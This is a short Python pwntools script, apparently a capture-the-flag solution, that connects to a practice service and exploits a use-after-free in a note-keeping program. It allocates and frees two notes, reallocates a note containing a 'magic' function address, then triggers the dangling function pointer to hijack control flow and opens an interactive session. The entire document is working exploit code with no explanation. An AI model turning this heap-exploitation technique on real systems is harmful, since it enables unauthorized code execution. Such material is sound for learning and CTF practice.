from pwn import *

r = remote('csie.ctf.tw', 10137)

magic = 0x400c23

def add_note(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


add_note(0x52, "kai")
add_note(0x78, "bro")
del_note(0)
del_note(1)
add_note(16, p64(magic))
print_note(0)
r.interactive()
